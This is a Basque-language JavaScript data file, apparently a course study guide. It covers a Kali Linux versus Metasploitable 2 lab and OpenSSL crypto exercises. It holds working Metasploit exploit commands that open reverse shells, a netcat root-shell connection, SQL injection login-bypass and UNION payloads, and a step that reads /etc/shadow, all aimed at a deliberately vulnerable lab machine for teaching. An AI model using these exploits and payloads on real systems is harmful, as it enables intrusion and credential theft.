// Zati Praktikoaren Datu-Base Osoa: Kali Linux -> Metasploitable 2 Kasu Praktikoa eta Kriptografia
window.PRAKTIKA_DATUAK = [
  // --- 0. ATALA: SARE TOPOLOGIA ETA ISOLAMENDUA (2.A PRAKTIKA) ---
  {
    id: "lab-topologia",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "1. Sare Topologia eta Laborategiaren Isolamendua (2.A Praktika)",
    azalpena: "VirtualBox bidezko laborategi segurua. Goierri Eskolako Wi-Fi sarean edo etxean zaudela eraso-proben trafikoa ez da inoiz ordenagailu fisikotik irteten.",
    pausoak: [
      {
        titulua: "Sare interfazeak eta IP helbideak egiaztatu:",
        komandoa: "ifconfig eth1 # Kali Linux (Host-Only IP: 192.168.56.105)\n# Metasploitable 2 xedearen IPa: 192.168.56.104",
        parametroak: "Kali Duala: eth0 (NAT modua, Interneterako) + eth1 (Host-Only 192.168.56.105, biktimarekin hitz egiteko).\nMetasploitable 2: eth0 (Host-Only 192.168.56.104 bakarrik, sare isolatuan).",
        emaitza: "eth1: inet 192.168.56.105 netmask 255.255.255.0 broadcast 192.168.56.255"
      },
      {
        titulua: "Konektibitatea eta ARP taula aztertu Kalitik:",
        komandoa: "ping -c 4 192.168.56.104\narp -n 192.168.56.104",
        parametroak: "ping -c 4: 4 ICMP pakete bidali (0% pakete-galera egiaztatzeko).\narp -n: Metasploitable-ren MAC helbidea ikusi (08:00:27:8a:35:7e).",
        emaitza: "4 packets transmitted, 4 received, 0% packet loss\nAddress          HWtype  HWaddress           Flags Mask   Iface\n192.168.56.104   ether   08:00:27:8a:35:7e   C            eth1"
      }
    ],
    kontuz: "EDOZEIN PRAKTIKA HASI AURRETIK: Atera bi makinen VirtualBox Snapshot (berehalako argazkia) egoera garbian. Zerbait ustekabean puskatzen bada, segundo batean hasierako egoerara itzul zaitezke."
  },

  // --- 1. ATALA: NMAP SARE-ESKANEOA ETA WRITEUP-A (2.D PRAKTIKA) ---
  {
    id: "nmap-ping",
    kategoria: "nmap",
    kategoriaIzena: "🔍 Nmap",
    izenburua: "2. Sareko Ekipo Biziak Aurkitzea (Ping Sweep)",
    azalpena: "Host-Only sarean (192.168.56.0/24) zein IP dauden piztuta azkar jakiteko. Ez ditu atakarik aztertzen, soilik ICMP/ARP erantzunak.",
    pausoak: [
      {
        titulua: "Sare osoa miatu ostalari aktiboak aurkitzeko:",
        komandoa: "nmap -sn 192.168.56.0/24",
        parametroak: "-sn: Portuen eskaneorik EZ egin (lehen -sP zen). Soilik ostalaria bizirik dagoen baieztatu.",
        emaitza: "Nmap scan report for 192.168.56.104\nHost is up (0.00045s latency).\nMAC Address: 08:00:27:8A:35:7E (Cadmus Computer Systems / VirtualBox)"
      }
    ],
    kontuz: "Sare lokal batean root gabe eginez gero, Nmap-ek TCP SYN erabiltzen du ICMPren ordez; baina root/sudo erabilita ARP eskaneo zuzena egiten du askoz azkarrago."
  },
  {
    id: "nmap-ports-all",
    kategoria: "nmap",
    kategoriaIzena: "🔍 Nmap",
    izenburua: "3. Portu Guztiak Aztertzea (-p- eta Denboralizazioa)",
    azalpena: "Nmap-ek lehenetsiz 1.000 portu ohikoenak bakarrik aztertzen ditu. Atzeko ateak (backdoors) ataka ez-ohikoetan egon ohi dira (adib. 1524 bindshell edo 3632 distccd); beraz, -p- derrigorrezkoa da errekonozimendu sakonean.",
    pausoak: [
      {
        titulua: "1etik 65.535 portu guzti-guztiak aztertu:",
        komandoa: "nmap -p- -T4 192.168.56.104",
        parametroak: "-p-: 1etik 65535era portu guzti-guztiak aztertu.\n-T4: Denboralizazio erasokorra (azkarrago exekutatzen du laborategian).",
        emaitza: "Not shown: 65512 closed tcp ports (reset)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n23/tcp   open  telnet\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n1524/tcp open  ingreslock\n3306/tcp open  mysql\n3632/tcp open  distccd\n6667/tcp open  irc"
      }
    ],
    kontuz: "Azterketan '-p-' jartzea ahazten baduzu, 1524 (root bindshell) edo 3632 (distccd) atakek ihes egingo dizute!"
  },
  {
    id: "nmap-writeup-sakona",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "4. Nmap Errekonozimendu Sakona (2.D Praktikako Writeup-a)",
    azalpena: "Klaseko 2.D praktikan erabilitako komando ofiziala: zerbitzuen bertsio zehatzak, script lehenetsiak eta OS aztarnak fitxategi batean gordez.",
    pausoak: [
      {
        titulua: "2.D Praktikako Nmap komando nagusia exekutatu:",
        komandoa: "nmap -sV -O -sC 192.168.56.104 -oN scanMetasploitable.txt",
        parametroak: "-sV: Zerbitzuen bertsio zehatzak detektatu (vsftpd 2.3.4, Apache 2.2.8, Samba 3.0.20).\n-O: Sistema Eragilea (OS Fingerprinting) detektatu (Linux 2.6.9 - 2.6.33).\n-sC: Nmap Script Engine (NSE) script lehenetsiak exekutatu.\n-oN scanMetasploitable.txt: Emaitza guztiak txosten-fitxategian gorde.",
        emaitza: "23 TCP portu ireki aurkitu dira guztira!\n21/tcp: vsftpd 2.3.4 (Anonymous sarbidea gaituta)\n22/tcp: OpenSSH 4.7p1\n23/tcp: Linux telnetd (zifratu gabeko komunikazioa)\n80/tcp: Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n139/445/tcp: Samba smbd 3.0.20-Debian\n1524/tcp: Metasploitable root shell (ingreslock)\n3306/tcp: MySQL 5.0.51a-3ubuntu5\n6667/tcp: UnrealIRCd"
      }
    ],
    kontuz: "Nola daki Nmap-ek zer sistema eragile den (-O)? TCP/IP erantzunen berezitasunak (TTL balioa, Window Size, DF flag) bere sinadura-basearekin konparatuz."
  },
  {
    id: "nmap-vuln-scripts",
    kategoria: "nmap",
    kategoriaIzena: "🔍 Nmap",
    izenburua: "5. Zaurgarritasun Ezagunak Eskaneatzea (--script=vuln)",
    azalpena: "Nmap Scripting Engine (NSE) erabiliz ataka irekietan zaurgarritasun ezagunak (CVE) automatikoki bilatzeko.",
    pausoak: [
      {
        titulua: "Zaurgarritasun scriptak xedearen aurka exekutatu:",
        komandoa: "nmap --script=vuln -p 21,22,80,139,445,3632,6667 192.168.56.104",
        parametroak: "--script=vuln: CVE datu-baseko scriptak probatu zerbitzu bakoitzaren kontra.",
        emaitza: "| ftp-vsftpd-backdoor: \n|   VULNERABLE: vsftpd version 2.3.4 backdoor\n|   State: VULNERABLE (Exploitable)\n|   IDs: CVE:CVE-2011-2523\n| smb-vuln-cve2007-2447: \n|   VULNERABLE: Samba usermap_script RCE"
      }
    ],
    kontuz: "Script honek zuzenean baieztatuko dizu zerbitzua erasogarria den edo ez, Metasploit abiarazi aurretik."
  },

  // --- 2. ATALA: ERASO PRAKTIKOAK METASPLOITABLE 2-REN KONTRA ---
  {
    id: "meta-vsftpd-backdoor",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "6. vsftpd 2.3.4 Atzeko Atea Ustiatzea (CVE-2011-2523)",
    azalpena: "21/tcp portuan dagoen FTP zerbitzari ahula. Garatzaileen biltegian txertatutako atzeko ate gaizto batek 6200 portuan root shell bat irekitzen du.",
    pausoak: [
      {
        titulua: "Metasploit abiarazi eta modulua kargatu:",
        komandoa: "msfconsole -q\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.104\nexploit",
        parametroak: "use exploit/unix/ftp/vsftpd_234_backdoor: Ustiatze-modulua hautatu.\nset RHOSTS 192.168.56.104: Xedearen (Metasploitable 2) IPa ezarri.\nexploit: Erasoa exekutatu.",
        emaitza: "[*] 192.168.56.104:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.56.104:21 - Backdoor response received\n[+] 192.168.56.104:21 - Backdoor opened on port 6200!\n[*] Found shell.\n[*] Command shell session 1 opened"
      },
      {
        titulua: "Root sarbidea egiaztatu shell barruan:",
        komandoa: "id\nuname -a",
        parametroak: "id: Uneko erabiltzailearen UID/GID erakutsi.\nuname -a: Kernelaren informazioa ikusi.",
        emaitza: "uid=0(root) gid=0(root)\nLinux metasploitable 2.6.24-16-server #1 SMP"
      }
    ],
    kontuz: "Nola dabil atzeko atea eskuz? FTPra konektatzean erabiltzaile izenean irribarre bat idazten bada (USER test:)), sistemak 6200 atakan root terminal bat irekitzen du!"
  },
  {
    id: "meta-port-1524-root",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "7. Port 1524 (Ingreslock) — Netcat Zuzeneko Root Shell!",
    azalpena: "AZTERKETAKO TRANPA: 1524 portuan zuzenean Root Shell bat dago irekita pasahitzik gabe. EZ DA METASPLOITIK BEHAR!",
    pausoak: [
      {
        titulua: "Kaliko terminaletik zuzenean konektatu Netcat bidez:",
        komandoa: "nc 192.168.56.104 1524",
        parametroak: "nc: Netcat tresna, TCP/UDP ataken konexio zuzena.\n1524: Ingreslock portua (Metasploitable2-n root shell lehenetsia).",
        emaitza: "root@metasploitable:/# \nid\nuid=0(root) gid=0(root) groups=0(root)"
      }
    ],
    kontuz: "Irakasleak galdetzen badizu: 'Nola lortu root sarbidea 2 segundotan tresna konplexurik gabe?', erantzuna 'nc 192.168.56.104 1524' da."
  },
  {
    id: "meta-samba-rce",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "8. Samba 3.0.20 usermap_script RCE (CVE-2007-2447)",
    azalpena: "445/tcp portuan Samba zerbitzariaren akats baten bidez urruneko komando-exekuzio zuzena lortu root gisa.",
    pausoak: [
      {
        titulua: "Metasploiteko Samba modulua konfiguratu eta exekutatu:",
        komandoa: "msfconsole -q\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.104\nset LHOST 192.168.56.105\nexploit",
        parametroak: "RHOSTS: Biktima (192.168.56.104).\nLHOST: Erasotzailea / Kali (192.168.56.105, Reverse konexioa jasotzeko).\nexploit: Payload-a bidali eta shell-a jaso.",
        emaitza: "[*] Started reverse TCP double handler on 192.168.56.105:4444\n[*] Accepted the first client connection...\n[*] Command shell session 1 opened!\nid\nuid=0(root) gid=0(root)"
      }
    ],
    kontuz: "Reverse shell bat denez, LHOST ezartzea derrigorrezkoa da: Kaliren eth1 IPa jarri behar duzu (192.168.56.105), bestela konexioa ez da itzuliko."
  },
  {
    id: "meta-mysql-direct",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "9. MySQL 5.0.51a Sarbide Zuzena eta Datu-Baseen Miaketa",
    azalpena: "3306/tcp portuan MySQL zerbitzariak root sarbidea baimentzen du pasahitzik gabe.",
    pausoak: [
      {
        titulua: "Kaliko terminaletik MySQLra konektatu:",
        komandoa: "mysql -h 192.168.56.104 -u root -p",
        parametroak: "-h 192.168.56.104: Xede zerbitzariaren helbidea.\n-u root: Root erabiltzailea.\n-p: Pasahitza eskatu (Sakatu ENTER hutsik uzteko).",
        emaitza: "Enter password: [ENTER]\nWelcome to the MySQL monitor. Commands end with ; or \\g.\nServer version: 5.0.51a-3ubuntu5 (Ubuntu)"
      },
      {
        titulua: "Datu-baseak miatu eta DVWA-ko erabiltzaileak atera:",
        komandoa: "SHOW DATABASES;\nUSE dvwa;\nSELECT user, password FROM users;",
        parametroak: "SHOW DATABASES: Datu-base guztiak zerrendatu.\nUSE dvwa: DVWA datu-basea hautatu.\nSELECT: Erabiltzaileen izenak eta MD5 hashak atera.",
        emaitza: "+-------+----------------------------------+\n| user  | password                         |\n+-------+----------------------------------+\n| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| gordon| e99a18c428cb38d5f260853678922e03 |\n+-------+----------------------------------+"
      }
    ],
    kontuz: "Datu-baseko pasahitzak MD5 hash formatuan daude (adib. 5f4dcc3b... = 'password'). Hashak deszifratzeko John the Ripper edo Hashcat erabil daiteke."
  },
  {
    id: "meta-unrealircd",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "10. UnrealIRCd 3.2.8.1 Troiarra (6667/tcp - CVE-2010-2075)",
    azalpena: "IRC zerbitzarian sartutako atzeko atea. Zerbitzariari bidalitako mezua DEBUG hitzarekin hasten bada, atzeko komandoa exekutatzen da baimenik gabe.",
    pausoak: [
      {
        titulua: "Metasploit modulua exekutatu:",
        komandoa: "msfconsole -q\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.104\nset LHOST 192.168.56.105\nexploit",
        parametroak: "RHOSTS: 192.168.56.104\nLHOST: 192.168.56.105",
        emaitza: "[*] Connected to 192.168.56.104:6667...\n[*] Sending backdoor command...\n[*] Command shell session 1 opened"
      }
    ],
    kontuz: "IRC zerbitzariak normalean ez du root gisa exekutatzen; saioa 'irc' erabiltzaile gisa irekitzen da. Pribilegioak igotzeko tokiko beste ahultasun bat beharko litzateke."
  },
  {
    id: "meta-distccd",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "11. distccd Daemon Komando Exekuzioa (3632/tcp)",
    azalpena: "C/C++ kodea banatuta konpilatzeko zerbitzua da. Konfigurazio akats baten ondorioz, edonork exekuta ditzake sistemako komandoak.",
    pausoak: [
      {
        titulua: "distccd modulua exekutatu:",
        komandoa: "msfconsole -q\nuse exploit/unix/misc/distcc_exec\nset RHOSTS 192.168.56.104\nexploit",
        parametroak: "set RHOSTS 192.168.56.104: Biktima ezarri.\nexploit: Erasoa abiarazi.",
        emaitza: "[*] Started reverse TCP handler on 192.168.56.105:4444\n[*] Command shell session opened\nid\nuid=1 (daemon) gid=1 (daemon)"
      }
    ],
    kontuz: "Saioa 'daemon' erabiltzaile arrunt gisa irekitzen da. Linux kernel 2.6 bertsiorako exploit bat (udev edo dirtycow) erabiliz root bihur daiteke."
  },

  // --- 3. ATALA: DVWA ETA WEB AHULTASUNAK (2.B ETA 2.C PRAKTIKAK) ---
  {
    id: "dvwa-konfigurazioa",
    kategoria: "sqli",
    kategoriaIzena: "💉 DVWA & SQLi",
    izenburua: "12. DVWA Ingurunea Prestatu eta Segurtasuna Ezarri (2.B Praktika)",
    azalpena: "Metasploitable 2-n integratuta datorren Damn Vulnerable Web App martxan jartzeko eta segurtasun-maila doitzeko pausoak.",
    pausoak: [
      {
        titulua: "Kaliko Firefox nabigatzailean ireki:",
        komandoa: "http://192.168.56.104/dvwa",
        parametroak: "Erabiltzailea: admin\nPasahitza: password",
        emaitza: "DVWA saio-hasiera pantaila arrakastatsua."
      },
      {
        titulua: "Datu-basea hasieratu eta segurtasuna baxuan jarri:",
        komandoa: "1. Ezkerreko menuan: 'Setup'\n2. Egin klik 'Create / Reset Database' botoian.\n3. Ezkerreko menuan: 'DVWA Security' -> Hautatu 'Low' eta sakatu 'Submit'.",
        parametroak: "Segurtasuna 'Low' ezartzeak balioztapen eta iragazte guztiak desgaitzen ditu, hezkuntza-helburuetarako.",
        emaitza: "Database has been created; Security level is now low."
      }
    ],
    kontuz: "Datu-basea hasieratu gabe utziz gero, SQL Injection probek erroreak emango dituzte daturik ez dagoelako."
  },
  {
    id: "sqli-login-bypass",
    kategoria: "sqli",
    kategoriaIzena: "💉 DVWA & SQLi",
    izenburua: "13. SQL Injection: Autentifikazioa Saihestea (Login Bypass)",
    azalpena: "Saio-hasierako formulario batean SQL logika manipulatuz pasahitza jakin gabe administratzaile gisa sartzeko teknika.",
    pausoak: [
      {
        titulua: "Erabiltzaile-eremuan txertatu:",
        komandoa: "admin' -- \n# Edo orokorra:\n' OR '1'='1",
        parametroak: "admin': Katea goiz ixten du.\n-- : Gainerako SQL kontsulta osoa (pasahitzaren egiaztapena) iruzkin bihurtzen du.",
        emaitza: "SELECT * FROM users WHERE user='admin' -- ' AND pass='xxx'\n-> Administratzaile gisa saioa hasi da pasahitzik gabe!"
      }
    ],
    kontuz: "MySQLn gidoi bikoitzaren ondoren zuriune bat jarri behar da (-- ) edo '#' erabili, bestela sintaxi-errorea emango du."
  },
  {
    id: "sqli-union-extract",
    kategoria: "sqli",
    kategoriaIzena: "💉 DVWA & SQLi",
    izenburua: "14. UNION SQL Injekzioa (Datu-baseko Datuak Erauztea)",
    azalpena: "Datu-baseko beste taula batzuetako datuak (erabiltzaileak, pasahitzak, kredentzialak) pantailaratzeko erasoa.",
    pausoak: [
      {
        titulua: "Zutabe kopurua zehaztu (ORDER BY bidez):",
        komandoa: "1' ORDER BY 1 #\n1' ORDER BY 2 #\n1' ORDER BY 3 #",
        parametroak: "Errorea eman arte zenbakia handitu. 3k errorea ematen badu, kontsultak 2 zutabe ditu.",
        emaitza: "Unknown column '3' in 'order clause' -> 2 zutabe daude."
      },
      {
        titulua: "Datuak erauzi UNION SELECT erabiliz:",
        komandoa: "1' UNION SELECT user, password FROM users #",
        parametroak: "users taulako 'user' eta 'password' zutabeak jatorrizko emaitzekin elkartu.",
        emaitza: "ID: 1' UNION SELECT user, password FROM users #\nFirst name: admin\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99"
      }
    ],
    kontuz: "UNION SELECT egiteko derrigorrezkoa da bi kontsulten zutabe kopurua eta datu motak berdinak izatea."
  },
  {
    id: "sqli-prebentzioa",
    kategoria: "sqli",
    kategoriaIzena: "💉 DVWA & SQLi",
    izenburua: "15. SQLi Prebentzioa: PHP PDO Kontsulta Prestatuak",
    azalpena: "SQL Injection erasoak saihesteko modu bakarra kontsulta prestatuak (Prepared Statements) erabiltzea da.",
    pausoak: [
      {
        titulua: "Kode segurua (PHP PDO):",
        komandoa: "$stmt = $pdo->prepare('SELECT id, user FROM users WHERE user = :user AND pass = :pass');\n$stmt->execute(['user' => $userInput, 'pass' => $passHash]);\n$user = $stmt->fetch();",
        parametroak: "Datuak eta kodea erabat bereizita bidaltzen dira datu-basera; beraz, kakotxek ez dute SQL sintaxia aldatzen.",
        emaitza: "Erasotzailearen injekzioak (' OR 1=1) testu huts gisa tratatzen dira eta erasoak huts egiten du."
      }
    ],
    kontuz: "Irakaslearen tranpa: addslashes() edo htmlspecialchars() ez dira nahikoak SQLi saihesteko; soilik Prepared Statements da segurua."
  },
  {
    id: "juice-shop-docker",
    kategoria: "sqli",
    kategoriaIzena: "💉 DVWA & SQLi",
    izenburua: "16. OWASP Juice Shop Docker Bidez (2.C Praktika)",
    azalpena: "Node.js aplikazio moderno ahul bat Docker bidez abiaraztea eta Score Board panela aurkitzea.",
    pausoak: [
      {
        titulua: "Docker zerbitzua piztu eta Juice Shop edukiontzia abiarazi:",
        komandoa: "sudo systemctl start docker\ndocker run -d -p 3000:3000 bkimminich/juice-shop",
        parametroak: "-d: Detached modua (hondoan exekutatu).\n-p 3000:3000: Ostalariko 3000 portua edukiontziko 3000 portuarekin lotu.",
        emaitza: "Kaliko nabigatzailean ireki: http://localhost:3000"
      },
      {
        titulua: "Score Board panela aurkitu (0. Erronka):",
        komandoa: "http://localhost:3000/#/score-board",
        parametroak: "Juice Shop-eko JavaScript fitxategietan arakatuz aurkitzen den ezkutuko ibilbidea.",
        emaitza: "Score Board panelak erronka guztien aurrerapena erakusten du."
      }
    ],
    kontuz: "Docker erabili ondoren makina motel ez ibiltzeko, gelditu edukiontzia: 'docker stop $(docker ps -q)'."
  },

  // --- 4. ATALA: SAIOAREN KUDEAKETA ETA ITZALTZE SEGURUA ---
  {
    id: "post-exploitation-poweroff",
    kategoria: "kali-meta",
    kategoriaIzena: "🎯 Kali ⚔️ Meta2",
    izenburua: "17. Saio Barruko Aginduak eta Makinak Garbi Itzaltzea",
    azalpena: "Behin root sarbidea lortuta zer informazio atera eta lana amaitutakoan makinak nola itzali disko birtualak ez kaltetzeko.",
    pausoak: [
      {
        titulua: "Linux shell barruan (vsftpd edo netcat 1524 bidez):",
        komandoa: "whoami\nid\ncat /etc/shadow | head -n 5\nuname -a",
        parametroak: "cat /etc/shadow: Erabiltzaileen pasahitz hash-ak irakurri (soilik root-ek irakur ditzake!).",
        emaitza: "root:$1$XN10X$If2512b...:14256:0:99999:7:::"
      },
      {
        titulua: "Makinak modu garbian itzaltzea (Poweroff):",
        komandoa: "# Metasploitable terminalean:\nsudo poweroff\n\n# Kali Linux terminalean:\nsudo poweroff",
        parametroak: "Ez itxi VirtualBox leihoa zuzenean (Power off the machine); disko birtualen datu-baseak honda daitezke.",
        emaitza: "System halted / Power down."
      }
    ],
    kontuz: "Meterpreter saioan bazaude, 'whoami' aginduak huts egingo du; 'getuid' erabili behar duzu, edo 'shell' tekleatu Linux terminal arrunt bat irekitzeko."
  },

  // --- 5. ATALA: KRIPTOGRAFIA OPENSSL BIDEZ (ESTEBEREN ARIKETAK) ---
  {
    id: "openssl-aes",
    kategoria: "simetrikoa",
    kategoriaIzena: "🔐 AES-256",
    izenburua: "18. Zifratze Simetrikoa AES-256-CBC bidez (OpenSSL)",
    azalpena: "Kriptografia simetrikoan gako bakarrarekin zifratu eta deszifratzen da. OpenSSL komandoaren sintaxi osoa gatza (salt) erabiliz.",
    pausoak: [
      {
        titulua: "Fitxategia zifratu (Encryption):",
        komandoa: "openssl enc -aes-256-cbc -salt -in mezu.txt -out mezu.enc -k Pasahitza123",
        parametroak: "-aes-256-cbc: 256 biteko AES algoritmoa CBC bloke moduan.\n-salt: Gatza gehitu ortzadar-taulen erasoak saihesteko (DERRIGORREZKOA).\n-in mezu.txt: Jatorrizko fitxategia.\n-out mezu.enc: Zifratutako fitxategia.\n-k: Pasahitza (parametro gisa edo eskuz eskatu dezake).",
        emaitza: "Fitxategi bitar ulertezina sortzen da mezu.enc izenarekin."
      },
      {
        titulua: "Fitxategia deszifratu (Decryption):",
        komandoa: "openssl enc -d -aes-256-cbc -in mezu.enc -out mezu_deszifratua.txt -k Pasahitza123",
        parametroak: "-d: Decrypt modua (deszifratzea adierazten du). Gainerako parametroak berdinak izan behar dira.",
        emaitza: "Jatorrizko testu arrunta leheneratzen da mezu_deszifratua.txt fitxategian."
      }
    ],
    kontuz: "Parametroen ordena: -in eta -out ez nahastu! Deszifratzean -d jartzea ahazten baduzu, mezu.enc berriro zifratzen saiatuko da."
  },
  {
    id: "openssl-rsa-keygen",
    kategoria: "asimetrikoa",
    kategoriaIzena: "🔑 RSA 2048",
    izenburua: "19. RSA 2048 Gako-Bikotea Sortzea (OpenSSL)",
    azalpena: "Kriptografia asimetrikoan gako pribatu bat eta gako publiko bat behar dira. Biak OpenSSL bidez nola sortu.",
    pausoak: [
      {
        titulua: "1. Gako pribatua sortu (2048 bit):",
        komandoa: "openssl genrsa -out gako_pribatua.pem 2048",
        parametroak: "genrsa: RSA gakoak sortzeko modulua.\n2048: Gakoaren luzera bitetan (gutxieneko gomendatua segurtasunerako).",
        emaitza: "Generating RSA private key, 2048 bit long modulus\ne is 65537 (0x010001)\ngako_pribatua.pem fitxategia sortu da."
      },
      {
        titulua: "2. Gako publikoa erauzi gako pribatutik:",
        komandoa: "openssl rsa -in gako_pribatua.pem -pubout -out gako_publikoa.pem",
        parametroak: "-pubout: Gako publikoa bakarrik atera eta gorde.\n-in: Gako pribatua abiapuntu gisa.",
        emaitza: "writing RSA key\ngako_publikoa.pem sortu da (partekatzeko modukoa)."
      }
    ],
    kontuz: "Gako pribatuaren baimenak murriztu behar dira beti Linuxen: 'chmod 600 gako_pribatua.pem' (beste inork ez irakurtzeko)."
  },
  {
    id: "openssl-rsa-encrypt",
    kategoria: "asimetrikoa",
    kategoriaIzena: "🔑 RSA 2048",
    izenburua: "20. Mezu Bat Zifratu eta Deszifratu RSA bidez",
    azalpena: "Mezu bat hartzailearen gako publikoarekin zifratu eta soilik bere gako pribatuarekin deszifratu.",
    pausoak: [
      {
        titulua: "Gako publikoarekin zifratu (Edonork egin dezake):",
        komandoa: "openssl pkeyutl -encrypt -pubin -inkey gako_publikoa.pem -in sekretua.txt -out sekretua.enc",
        parametroak: "-encrypt: Zifratu operazioa.\n-pubin: Erabilitako gakoa publikoa dela zehaztu.\n-inkey gako_publikoa.pem: Hartzailearen gako publikoa.",
        emaitza: "sekretua.enc fitxategi zifratua sortzen da."
      },
      {
        titulua: "Gako pribatuarekin deszifratu (Soilik hartzaileak):",
        komandoa: "openssl pkeyutl -decrypt -inkey gako_pribatua.pem -in sekretua.enc -out sekretua_desz.txt",
        parametroak: "-decrypt: Deszifratu operazioa.\n-inkey gako_pribatua.pem: Norberaren gako pribatua (ez da -pubin jartzen hemen).",
        emaitza: "Jatorrizko testua leheneratzen da."
      }
    ],
    kontuz: "RSA oso motela da datu handiekin. Praktikan gako simetriko bat (AES) RSA bidez trukatzen da eta datuak AES bidez zifratzen dira (Zifratze Hibridoa)."
  },
  {
    id: "openssl-signature",
    kategoria: "hash",
    kategoriaIzena: "✍️ Sinadura & Hash",
    izenburua: "21. Sinadura Digitala Sortu eta Egiaztatu (SHA-256)",
    azalpena: "Dokumentu baten egiletza eta osotasuna bermatzea sinadura digital bidez (gako pribatuarekin sinatu, publikoarekin egiaztatu).",
    pausoak: [
      {
        titulua: "Dokumentua sinatu gako pribatuarekin:",
        komandoa: "openssl dgst -sha256 -sign gako_pribatua.pem -out sinadura.bin dokumentua.pdf",
        parametroak: "dgst -sha256: SHA-256 hash funtzioa erabili.\n-sign gako_pribatua.pem: Igorlearen gako pribatuarekin hash-a zifratu (sinadura sortu).\n-out sinadura.bin: Sortutako sinadura fitxategia.",
        emaitza: "sinadura.bin fitxategi bitarra sortzen da."
      },
      {
        titulua: "Sinadura egiaztatu gako publikoarekin:",
        komandoa: "openssl dgst -sha256 -verify gako_publikoa.pem -signature sinadura.bin dokumentua.pdf",
        parametroak: "-verify gako_publikoa.pem: Igorlearen gako publikoarekin sinadura deszifratu eta hash-arekin konparatu.\n-signature sinadura.bin: Egiaztatuko den sinadura.",
        emaitza: "Verified OK (Zuzena bada) edo Verification Failure (dokumentua ukitu bada)."
      }
    ],
    kontuz: "Sinadura digitalaren arau urrezkoa: SINATU gako PRIBATUAREKIN egiten da; EGIAZTATU gako PUBLIKOAREKIN egiten da. Ez nahastu zifratzearekin!"
  },
  {
    id: "openssl-hmac",
    kategoria: "hash",
    kategoriaIzena: "✍️ Sinadura & Hash",
    izenburua: "22. HMAC eta Hash Integritate Egiaztapena",
    azalpena: "Mezu baten autentifikazioa eta osotasuna bermatzea gako sekretu partekatu batekin (HMAC) edo hash arruntarekin (sha256sum).",
    pausoak: [
      {
        titulua: "Fitxategi baten SHA-256 hash-a kalkulatu:",
        komandoa: "sha256sum dokumentua.pdf",
        parametroak: "sha256sum: 64 karaktere hexadezimaleko aztarna bakarra kalkulatzen du.",
        emaitza: "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e  dokumentua.pdf"
      },
      {
        titulua: "HMAC kalkulatu gako sekretuarekin:",
        komandoa: "openssl dgst -sha256 -hmac 'GoierriEskola2026' dokumentua.pdf",
        parametroak: "-hmac: Hash bati gako sekretu bat txertatzen dio; gakorik ez duenak ezin du HMAC baliodunik sortu.",
        emaitza: "HMAC-SHA256(dokumentua.pdf)= 8b43f9a721c5b8e1..."
      }
    ],
    kontuz: "Hash arruntak (sha256sum) osotasuna bermatzen du (istripuzko aldaketak hautemateko), baina EZ autentifikazioa. HMAC-ek autentifikazioa eta osotasuna biak bermatzen ditu."
  },

  // --- 6. ATALA: PORTUEN ETA ZAURGARRITASUNEN TXULETA OSOA ---
  {
    id: "txuleta-portuak-taula",
    kategoria: "txuleta",
    kategoriaIzena: "📋 Txuleta Azkarra",
    izenburua: "23. Metasploitable 2: 23 Portu eta Zerbitzu Kritikoen Taula",
    azalpena: "Azterketa praktikorako erreferentzia osoa eta azkarra: ataka zenbakia, zerbitzua, bertsioa eta ustiatzeko modua.",
    pausoak: [
      {
        titulua: "Portu irekien eta arriskuen zerrenda azkarra:",
        komandoa: "# METASPLOITABLE 2 (192.168.56.104) PORTU NAGUSIAK:\n# 21/tcp   | vsftpd 2.3.4       | CVE-2011-2523 Backdoor (Metasploit edo telnet)\n# 22/tcp   | OpenSSH 4.7p1      | Kredentzial ahulak (msfadmin/msfadmin)\n# 23/tcp   | Linux telnetd      | Testu arrunteko trafikoa (sniffing)\n# 80/tcp   | Apache 2.2.8       | DVWA (SQLi, XSS, Command Execution)\n# 139/445  | Samba 3.0.20       | CVE-2007-2447 usermap_script (Root RCE)\n# 1524/tcp | Ingreslock         | ROOT SHELL ZUZENEAN: nc 192.168.56.104 1524\n# 3306/tcp | MySQL 5.0.51a      | Root pasahitzik gabe: mysql -u root -p\n# 3632/tcp | distccd v1         | CVE-2004-2687 Command Exec (distcc_exec)\n# 6667/tcp | UnrealIRCd         | CVE-2010-2075 Backdoor (DEBUG troiarra)",
        parametroak: "Taula hau buruz jakiteak azterketa praktikoaren %80 konpontzen du minutu gutxitan.",
        emaitza: "Guztira 23 TCP portu ireki aurkitu dira 2.D praktikan."
      }
    ],
    kontuz: "Azterketan lehentasuna eman beti root zuzena ematen dutenei: 1524 (nc), 21 (vsftpd), eta 445 (samba usermap_script)."
  }
];
